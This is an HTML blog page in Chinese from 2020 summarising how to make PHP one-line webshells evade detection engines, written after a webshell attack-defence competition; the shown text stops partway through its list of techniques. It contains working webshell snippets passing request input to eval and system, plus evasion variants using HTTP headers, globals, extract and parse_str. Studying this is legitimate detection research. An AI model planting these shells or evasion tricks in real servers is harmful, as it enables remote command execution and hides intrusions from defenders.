@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>PHP Webshell 免杀的一些思考与总结 - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="Share learn & Share life.">
+
+
+
+<meta name="keywords" content="Threezh1">
+
+
+
+    <meta name="description" content="&amp;#x6700;&amp;#x8FD1;&amp;#x56F4;&amp;#x89C2;&amp;#x4E86;&amp;#x4E00;&amp;#x6B21;Webshell&amp;#x653B;&amp;#x9632;&amp;#x7684;&amp;#x6BD4;&amp;#x8D5B;&amp;#xFF0C;&amp;#x5185;&amp;#x5BB9;&amp;#x5927;&amp;#x81F4;&amp;#x5C31;&amp;#x662F;&amp;#x901A;&amp;#x8FC7;&amp;#x6784;&amp;#x9020;php webs">
+<meta name="keywords" content="PHP,Bypass,Webshell,免杀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP Webshell 免杀的一些思考与总结">
+<meta property="og:url" content="http://yoursite.com/2020/05/09/PHP_Webshell_Bypass/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="&amp;#x6700;&amp;#x8FD1;&amp;#x56F4;&amp;#x89C2;&amp;#x4E86;&amp;#x4E00;&amp;#x6B21;Webshell&amp;#x653B;&amp;#x9632;&amp;#x7684;&amp;#x6BD4;&amp;#x8D5B;&amp;#xFF0C;&amp;#x5185;&amp;#x5BB9;&amp;#x5927;&amp;#x81F4;&amp;#x5C31;&amp;#x662F;&amp;#x901A;&amp;#x8FC7;&amp;#x6784;&amp;#x9020;php webs">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="https://i.loli.net/2020/05/09/jQDF6qm9K8GlXvM.png">
+<meta property="og:updated_time" content="2020-05-09T06:56:11.326Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP Webshell 免杀的一些思考与总结">
+<meta name="twitter:description" content="&amp;#x6700;&amp;#x8FD1;&amp;#x56F4;&amp;#x89C2;&amp;#x4E86;&amp;#x4E00;&amp;#x6B21;Webshell&amp;#x653B;&amp;#x9632;&amp;#x7684;&amp;#x6BD4;&amp;#x8D5B;&amp;#xFF0C;&amp;#x5185;&amp;#x5BB9;&amp;#x5927;&amp;#x81F4;&amp;#x5C31;&amp;#x662F;&amp;#x901A;&amp;#x8FC7;&amp;#x6784;&amp;#x9020;php webs">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/09/jQDF6qm9K8GlXvM.png">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+</head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/about">关于</a>
+            
+            <a class="navbar-item " href="http://121.36.32.184/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Suche" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Inhaltsverzeichnis">
+                    <i class="fa fa-list"></i>
+                </a>
+                <div class="navbar-dropdown is-right">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#免杀思路">1&nbsp;&nbsp;<b>免杀思路</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#简要思路">1.1&nbsp;&nbsp;简要思路</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#Webshell测试用例">1.2&nbsp;&nbsp;Webshell测试用例</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#寻找免杀引擎覆盖范围以外可利用的函数">1.3&nbsp;&nbsp;寻找免杀引擎覆盖范围以外可利用的函数</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#不同的混淆方式">1.4&nbsp;&nbsp;不同的混淆方式</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#特殊的技巧">1.5&nbsp;&nbsp;特殊的技巧</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#参考">2&nbsp;&nbsp;<b>参考</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            PHP Webshell 免杀的一些思考与总结
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2020-05-09T06:47:10.161Z" itemprop="datePublished">May 9 2020</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            13 minutes lesen (Über 1956 Wörter)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>&#x6700;&#x8FD1;&#x56F4;&#x89C2;&#x4E86;&#x4E00;&#x6B21;Webshell&#x653B;&#x9632;&#x7684;&#x6BD4;&#x8D5B;&#xFF0C;&#x5185;&#x5BB9;&#x5927;&#x81F4;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x6784;&#x9020;php webshell&#xFF0C;&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#x3002;&#x4EE3;&#x7801;&#x8D8A;&#x77ED;&#xFF0C;&#x5206;&#x6570;&#x8D8A;&#x9AD8;&#x3002;&#x5728;&#x6BD4;&#x8D5B;&#x4E4B;&#x540E;&#x770B;&#x4E86;&#x4E00;&#x4E9B;&#x8D44;&#x6599;&#x4E0E;&#x5927;&#x4F6C;&#x4EEC;&#x6BD4;&#x8D5B;&#x7684;&#x7ED5;&#x8FC7;&#x6587;&#x7AE0;&#xFF0C;&#x5B66;&#x4E60;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x3002;&#x672C;&#x60F3;&#x50CF;xss&#x90A3;&#x6837;&#x628A;&#x57FA;&#x672C;&#x7684;&#x59FF;&#x52BF;&#x90FD;&#x6574;&#x7406;&#x597D;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;php&#x6784;&#x9020;&#x7684;&#x65B9;&#x5F0F;&#x5B9E;&#x5728;&#x592A;&#x591A;&#xFF0C;&#x53EA;&#x80FD;&#x6574;&#x7406;&#x4E00;&#x5C0F;&#x90E8;&#x5206;&#x3002;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x5230;&#x7684;&#x5185;&#x5BB9;&#x5C31;&#x7559;&#x5230;&#x540E;&#x9762;&#x518D;&#x6162;&#x6162;&#x5B66;&#x4E60;&#x5427;&#x2026; &#x8FD9;&#x91CC;&#x53EA;&#x9488;&#x5BF9;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x8FDB;&#x884C;&#x7684;&#x514D;&#x6740;&#x603B;&#x7ED3;&#xFF0C;&#x6240;&#x4EE5;&#x5927;&#x9A6C;&#x90E8;&#x5206;&#x5C31;&#x5148;&#x820D;&#x5F03;&#x3002;</p>
+<p>&#x53C2;&#x8003;&#x7684;&#x6587;&#x7AE0;&#x90FD;&#x5DF2;&#x5728;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x5217;&#x51FA;&#xFF0C;&#x8FD9;&#x7BC7;&#x77ED;&#x6587;&#x4EC5;&#x5C06;&#x601D;&#x8DEF;&#x4E0E;&#x4E00;&#x4E9B;&#x77E5;&#x8BC6;&#x70B9;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002;&#xFF08;&#x5176;&#x5B9E;&#x66F4;&#x50CF;&#x662F;&#x4E00;&#x4E2A;&#x5907;&#x5FD8;&#x5F55;&#xFF09;<br><a id="more"></a></p>
+<h2 id="&#x514D;&#x6740;&#x601D;&#x8DEF;"><a href="#&#x514D;&#x6740;&#x601D;&#x8DEF;" class="headerlink" title="&#x514D;&#x6740;&#x601D;&#x8DEF;"></a>&#x514D;&#x6740;&#x601D;&#x8DEF;</h2><p>&#x5728;&#x4E03;&#x591C;&#x5B89;&#x5168;&#x535A;&#x5BA2;&#x7684;&#x516C;&#x4F17;&#x53F7;&#x6587;&#x7AE0;&#x4E2D;&#xFF0C;&#x5DF2;&#x7ECF;&#x5F88;&#x597D;&#x7684;&#x628A;&#x601D;&#x8DEF;&#x68B3;&#x7406;&#x4E86;</p>
+<p><img src="https://i.loli.net/2020/05/09/jQDF6qm9K8GlXvM.png" alt="Untitled.png"></p>
+<p>&#x4F46;&#x8FD9;&#x91CC;&#x53EA;&#x662F;&#x7B80;&#x7565;&#x7684;&#x7ED9;&#x4E86;&#x4E00;&#x4E2A;&#x5F15;&#x5BFC;&#xFF0C;&#x63D0;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x601D;&#x8DEF;&#x3002;&#x5177;&#x4F53;&#x8981;&#x600E;&#x4E48;&#x5B9E;&#x73B0;&#xFF0C;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x53BB;&#x6574;&#x7406;&#x8D44;&#x6599;&#x3002;</p>
+<h3 id="&#x7B80;&#x8981;&#x601D;&#x8DEF;"><a href="#&#x7B80;&#x8981;&#x601D;&#x8DEF;" class="headerlink" title="&#x7B80;&#x8981;&#x601D;&#x8DEF;"></a>&#x7B80;&#x8981;&#x601D;&#x8DEF;</h3><ul>
+<li>&#x6D4B;&#x8BD5;&#x5F15;&#x64CE;&#x7684;&#x8986;&#x76D6;&#x7387;&#x3001;&#x8BEF;&#x62A5;&#x7387;&#x3001;&#x5BB9;&#x5FCD;&#x5EA6;<ol>
+<li>&#x8986;&#x76D6;&#x7387;&#xFF1A;&#x4E0D;&#x540C;&#x79CD;&#x7C7B;&#x7684;webshell&#x67E5;&#x6740;&#x60C5;&#x51B5;</li>
+<li>&#x8BEF;&#x62A5;&#x7387;&#xFF1A;&#x6709;&#x6076;&#x610F;&#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x65E0;&#x6076;&#x610F;&#x529F;&#x80FD;&#x7684;webshell&#x67E5;&#x6740;&#x60C5;&#x51B5;</li>
+<li>&#x5BB9;&#x5FCD;&#x5EA6;&#xFF1A;&#x7528;&#x6B63;&#x5E38;&#x6837;&#x672C;&#xFF0C;&#x4E0D;&#x65AD;&#x6DFB;&#x52A0;&#x654F;&#x611F;&#x51FD;&#x6570;&#x548C;&#x53C2;&#x6570;&#xFF0C;&#x6D4B;&#x8BD5;&#x67E5;&#x6740;&#x60C5;&#x51B5;</li>
+</ol>
+</li>
+<li><p>&#x9A8C;&#x8BC1;&#x6D4B;&#x8BD5;&#x5F15;&#x64CE;&#x68C0;&#x6D4B;webshell&#x7684;&#x65B9;&#x5F0F;</p>
+<ol>
+<li><p>&#x57FA;&#x4E8E;&#x6B63;&#x5219;&#x6587;&#x672C;&#x7279;&#x5F81;&#x68C0;&#x6D4B;</p>
+<p> &#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x597D;&#x7684;&#x901A;&#x8FC7;&#x6DF7;&#x6DC6;&#x7ED5;</p>
+</li>
+<li><p>&#x57FA;&#x4E8E;&#x7EDF;&#x8BA1;&#x7279;&#x5F81;&#x7684;&#x6587;&#x672C;&#x68C0;&#x6D4B;</p>
+<p> &#x540C;&#x6837;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6DF7;&#x6DC6;&#x7ED5;&#x8FC7;</p>
+</li>
+<li><p>&#x57FA;&#x4E8E;AST&#x7684;&#x8BED;&#x6CD5;&#x7279;&#x5F81;&#x68C0;&#x6D4B;</p>
+<p> &#x57FA;&#x4E8E;PHP&#x52A8;&#x6001;&#x51FD;&#x6570;</p>
+</li>
+<li><p>&#x52A8;/&#x9759;&#x6001;&#x7B26;&#x53F7;&#x6267;&#x884C;</p>
+<p> &#x5224;&#x65AD;&#x65B9;&#x6CD5;&#x662F;&#x5916;&#x90E8;&#x53D8;&#x91CF;&#x8FDB;&#x5165;&#x7279;&#x6B8A;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x7279;&#x6B8A;&#x7684;&#x51FD;&#x6570;&#x65E0;&#x6CD5;&#x5305;&#x542B;&#x5168;&#x90E8;&#x7684;&#x5371;&#x9669;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BFB;&#x627E;&#x7279;&#x6B8A;&#x7684;&#x51FD;&#x6570;&#x3001;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;</p>
+</li>
+<li><p>&#x673A;&#x5668;&#x5B66;&#x4E60;/&#x6DF1;&#x5EA6;&#x5B66;&#x4E60;</p>
+<p> &#x8FD9;&#x7C7B;&#x68C0;&#x6D4B;&#x662F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x96BE;&#x7ED5;&#x8FC7;&#xFF0C;&#x4F46;&#x662F;&#x8BEF;&#x62A5;&#x548C;&#x8303;&#x56F4;&#x662F;&#x4F1A;&#x4E00;&#x76F4;&#x5B58;&#x5728;&#x3002;&#x901A;&#x8FC7;&#x5BFB;&#x627E;&#x5230;&#x5B83;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;&#x9700;&#x8981;&#x6D4B;&#x8BD5;&#x5404;&#x79CD;&#x6DF7;&#x6DC6;&#x4E0E;&#x9A9A;&#x64CD;&#x4F5C;&#xFF0C;&#x642D;&#x914D;&#x4E0D;&#x540C;&#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;</p>
+</li>
+<li><p>&#x6C99;&#x7BB1;</p>
+</li>
+</ol>
+</li>
+<li>&#x5BFB;&#x627E;&#x89E3;&#x51B3;&#x65B9;&#x6848;<ol>
+<li>&#x5BFB;&#x627E;&#x514D;&#x6740;&#x5F15;&#x64CE;&#x8986;&#x76D6;&#x8303;&#x56F4;&#x4EE5;&#x5916;&#x53EF;&#x5229;&#x7528;&#x7684;&#x51FD;&#x6570;</li>
+<li>&#x4E0D;&#x540C;&#x7684;&#x6DF7;&#x6DC6;&#x65B9;&#x5F0F;</li>
+<li>&#x7279;&#x6B8A;&#x7684;&#x6280;&#x5DE7;</li>
+</ol>
+</li>
+</ul>
+<p>&#x518D;&#x5BF9;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x7B80;&#x8981;&#x7684;&#x6C47;&#x603B;&#x3002;</p>
+<h3 id="Webshell&#x6D4B;&#x8BD5;&#x7528;&#x4F8B;"><a href="#Webshell&#x6D4B;&#x8BD5;&#x7528;&#x4F8B;" class="headerlink" title="Webshell&#x6D4B;&#x8BD5;&#x7528;&#x4F8B;"></a>Webshell&#x6D4B;&#x8BD5;&#x7528;&#x4F8B;</h3><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// &#x4E0D;&#x540C;&#x79CD;&#x7C7B;&#x7684;&#x51FD;&#x6570;&#x6D4B;&#x8BD5;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($a); <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> system($a); <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $b($a); <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> call_user_func($b, $a); <span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x540C;&#x4E00;&#x51FD;&#x6570;&#x7684;&#x4E0D;&#x540C;&#x5F62;&#x5F0F;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET); <span class="hljs-meta">?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($a); <span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x52A8;&#x6001;&#x6267;&#x884C;&#x7684;&#x5224;&#x65AD;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	<span class="hljs-keyword">if</span> (<span class="hljs-number">1</span>) {</span><br><span class="line">	    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br><span class="line">	} <span class="hljs-keyword">else</span> {</span><br><span class="line">	    <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);</span><br><span class="line">	} </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x52A8;&#x6001;&#x6267;&#x884C; + &#x654F;&#x611F;&#x51FD;&#x6570;&#x5224;&#x65AD;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	$a = func($_GET[<span class="hljs-number">1</span>]);</span><br><span class="line">	<span class="hljs-keyword">eval</span>($a); </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	$a = fun1($_GET[<span class="hljs-number">1</span>]);</span><br><span class="line">	func2($a);   </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="&#x5BFB;&#x627E;&#x514D;&#x6740;&#x5F15;&#x64CE;&#x8986;&#x76D6;&#x8303;&#x56F4;&#x4EE5;&#x5916;&#x53EF;&#x5229;&#x7528;&#x7684;&#x51FD;&#x6570;"><a href="#&#x5BFB;&#x627E;&#x514D;&#x6740;&#x5F15;&#x64CE;&#x8986;&#x76D6;&#x8303;&#x56F4;&#x4EE5;&#x5916;&#x53EF;&#x5229;&#x7528;&#x7684;&#x51FD;&#x6570;" class="headerlink" title="&#x5BFB;&#x627E;&#x514D;&#x6740;&#x5F15;&#x64CE;&#x8986;&#x76D6;&#x8303;&#x56F4;&#x4EE5;&#x5916;&#x53EF;&#x5229;&#x7528;&#x7684;&#x51FD;&#x6570;"></a>&#x5BFB;&#x627E;&#x514D;&#x6740;&#x5F15;&#x64CE;&#x8986;&#x76D6;&#x8303;&#x56F4;&#x4EE5;&#x5916;&#x53EF;&#x5229;&#x7528;&#x7684;&#x51FD;&#x6570;</h3><ul>
+<li>&#x901A;&#x8FC7;PHP&#x624B;&#x518C;&#x5BFB;&#x627E;&#x53EF;&#x5229;&#x7528;&#x7684;&#x51FD;&#x6570;</li>
+</ul>
+<p><a href="https://www.php.net/manual/zh/indexes.functions.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/</a></p>
+<ul>
+<li>get_defined_functions&#x83B7;&#x53D6;&#x6240;&#x6709;&#x5DF2;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#xFF08;&#x5305;&#x62EC;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x51FD;&#x6570;&#xFF09;</li>
+</ul>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$array = get_defined_functions();</span><br><span class="line"><span class="hljs-keyword">foreach</span> ($array[<span class="hljs-string">&quot;internal&quot;</span>] <span class="hljs-keyword">as</span> $function_name)</span><br><span class="line">{</span><br><span class="line">	$function = <span class="hljs-keyword">new</span> ReflectionFunction($function_name);</span><br><span class="line">	$function_params = $function-&gt;getParameters();</span><br><span class="line">	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nName: &quot;</span>.$function_name.<span class="hljs-string">&quot;\n&quot;</span>;</span><br><span class="line">	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Params:\n&quot;</span>;</span><br><span class="line">	<span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; sizeof($function_params); $i++)</span><br><span class="line">	{</span><br><span class="line">		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;  &quot;</span>.$function_params[$i]-&gt;name.<span class="hljs-string">&quot;\n&quot;</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>google</li>
+</ul>
+<p><code>site:php.net inurl:function current symbol table</code></p>
+<h3 id="&#x4E0D;&#x540C;&#x7684;&#x6DF7;&#x6DC6;&#x65B9;&#x5F0F;"><a href="#&#x4E0D;&#x540C;&#x7684;&#x6DF7;&#x6DC6;&#x65B9;&#x5F0F;" class="headerlink" title="&#x4E0D;&#x540C;&#x7684;&#x6DF7;&#x6DC6;&#x65B9;&#x5F0F;"></a>&#x4E0D;&#x540C;&#x7684;&#x6DF7;&#x6DC6;&#x65B9;&#x5F0F;</h3><ul>
+<li>&#x4E0D;&#x540C;&#x7684;&#x5165;&#x53E3;</li>
+</ul>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_COOKIE</span><br><span class="line">$_FILES</span><br><span class="line">$_SERVER</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4ECE;&#x8FDC;&#x7A0B;&#x8FDC;&#x7A0B;URL&#x4E2D;&#x83B7;&#x53D6;&#x6570;&#x636E;: file_get_contents&#x3001;curl&#x3001;svn_checkout...(&#x5C06;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x6570;&#x636E;&#x653E;&#x5728;&#x8FDC;&#x7A0B;URL&#x4E2D;&#xFF0C;&#x901A;&#x8FC7;URL_INCLUDE&#x6765;&#x8BFB;&#x53D6;)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4ECE;&#x78C1;&#x76D8;&#x6587;&#x4EF6;&#x4E2D;&#x83B7;&#x53D6;&#x6570;&#x636E;: file&#x3001;file_get_contents...(&#x5C06;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x6570;&#x636E;&#x653E;&#x5728;&#x78C1;&#x76D8;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5229;&#x7528;IO&#x51FD;&#x6570;&#x6765;&#x8BFB;&#x53D6;)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x8BFB;&#x53D6;(&#x5C06;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x653E;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x5229;&#x7528;&#x6570;&#x636E;&#x5E93;&#x51FD;&#x6570;&#x6765;&#x8BFB;&#x53D6;)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4ECE;&#x56FE;&#x7247;&#x5934;&#x90E8;&#x4E2D;&#x83B7;&#x53D6;: exif_read_data...(&#x5C06;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x6570;&#x636E;&#x653E;&#x5728;&#x56FE;&#x7247;&#x5934;&#x90E8;&#x4E2D;&#xFF0C;&#x5229;&#x7528;&#x56FE;&#x7247;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x6765;&#x8BFB;&#x53D6;)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x4F20;&#x5165;&#x8FDB;&#x53BB;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x7248;&#x672C;&#x9650;&#x5236;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> import_request_variables(<span class="hljs-string">&quot;g&quot;</span>);$a($b); <span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// HTTP Header</span></span><br><span class="line">**&lt;**?php <span class="hljs-keyword">eval</span>(get_headers(<span class="hljs-string">&quot;/&quot;</span>){<span class="hljs-number">9</span>}); <span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x5168;&#x5C40;&#x53D8;&#x91CF;</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">	$a = $GLOBALS[<span class="hljs-string">&apos;_GET&apos;</span>][<span class="hljs-number">0</span>];</span><br><span class="line">	system($a);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// &#x81EA;&#x5DF1;&#x4FDD;&#x7559;&#x4E86;&#x4E00;&#x4E9B;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x53D8;&#x91CF;&#x6C61;&#x67D3;&#xFF08;&#x53D8;&#x91CF;&#x8986;&#x76D6;&#xFF09;</li>
+</ul>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// extract</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> $GLOBALS[<span class="hljs-string">&apos;a&apos;</span>] = $_GET;extract($a);$a($b); <span class="hljs-meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// parse_str</span></span><br><span class="line"><span class="hljs-meta">&lt;?php</span> parse_str($_GET[<span class="hljs-number">0</span>]);$a($b); <span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&#x6570;&#x636E;&#x963B;&#x65AD;</li>
+</ul>
